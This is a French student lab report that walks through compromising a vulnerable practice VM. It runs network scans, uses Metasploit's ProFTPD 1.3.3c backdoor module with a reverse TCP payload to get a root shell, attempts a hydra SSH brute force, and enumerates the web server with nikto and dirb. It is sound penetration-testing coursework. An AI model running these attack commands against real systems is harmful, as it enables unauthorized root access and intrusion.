# Rapport du TP2

Comme d'habitude on commence par scanner toutes les machines sur le réseau
`sudo netdiscover -r 10.0.2.0/24`

Cela nous permet d'obtenir l'adresse ip de la machine que l'on souhaite attaquer : 10.0.2.6/24

on commence par faire une analyse détaillée de tous les ports ouverts.
`nmap -sC -sV -A -p- 10.0.2.6`

![1732270069043](image/rapport-tp3/1732270069043.png)

On voit que 3 ports sont ouverts : le 21, le 22 et le 80

## Port 21

On peut essayer de se connecter en ftp (avec l'identifiant et le mdp 'ftp')
`ftp 10.0.2.6`
La connexion echoue.

![1732270713862](image/rapport-tp3/1732270713862.png)

Dans l'analyse des ports, on remarque que la version est "ProFTPD 1.3.3c"

On peut essayer d'utiliser `msfconsole` pour accéder au shell metasploit qui permet de rechercher des vulnérabilités.

`search PROFTPD 1.3.3c`

![1732274049690](image/rapport-tp3/1732274049690.png)

`use 0` pour séléctionner "exploit/unix/ftp/proftpd_133c_backdoor"

![1732274737827](image/rapport-tp3/1732274737827.png)

En accédant aux `options`, on constate que rhost n'est pas configuré. On défini donc l'ip de rhost.
`set rhost 10.0.2.6`

Rport est correctement cofiguré, on y touche pas.

On affiche les payloads

![1732274488451](image/rapport-tp3/1732274488451.png)

Dans notre cas, on veux une reverse TCP connexion donc on séléctionne l'élément 4 `set payload 4`

Dans les options, on voit que LHOST est requis mais n'est pas défini. Il faut donc lui assigné l'ip de la machine hôte.
`set lhost 10.0.2.4`

Avec la commande `run`, on peut maintenant exploiter la faille de sécurité pour se connecter en ftp.

![1732275074257](image/rapport-tp3/1732275074257.png)

On constate qu'une connexion est bien ouverte (10.0.2.4:4444 -> 10.0.2.6:34682) et si je tape la commande `whoami`, je suis bien utilisateur root. De plus, 

Je peux ouvrir un shell et faire toutes les manipulations souhaitées sur la machine cible en tant que root.

![1732275364664](image/rapport-tp3/1732275364664.png)

## Port 22

Le port 22 est associé à ssh donc on va faire une attaque brut force en utilisant hydra.
`sudo hydra -l root -p /usr/share/wordlists/metasploit/unix-users.txt -t 6 ssh://10.0.2.6`

Sans succès...

![1732271041497](image/rapport-tp3/1732271041497.png)

## Port 80

Il s'agit d'un serveur web, on peut se rendre à l'url `10.0.2.6`
On tombe sur une page web avec rien de spécial dessus.

![1732270433602](image/rapport-tp3/1732270433602.png)

En inspectant le code source de la page je ne vois rien non plus.

Je peux faire un scan nikto

`nikto -h 10.0.2.6`

![1732271735114](image/rapport-tp3/1732271735114.png)


Je peux également utliser dirb.

`dirb http://10.0.2.6`

On découvre dans les 2 cas un dossier "/secret"

On se rend donc à l'url `http://10.0.2.6/secret`

![1732271266395](image/rapport-tp3/1732271266395.png)

On tombe sur un "blog secret"

Lorsque l'on clique sur les lien, cela nous redirige vers une pga inacessible et l'url change `vtcsec/...`

![1732271364228](image/rapport-tp3/1732271364228.png)

Après avoir réussi à accéder à la machine en tant que root en passant par le port 21, je me rend compte que "vtcsec" correspond bien à l'utilisateur root

![1732275561481](image/rapport-tp3/1732275561481.png)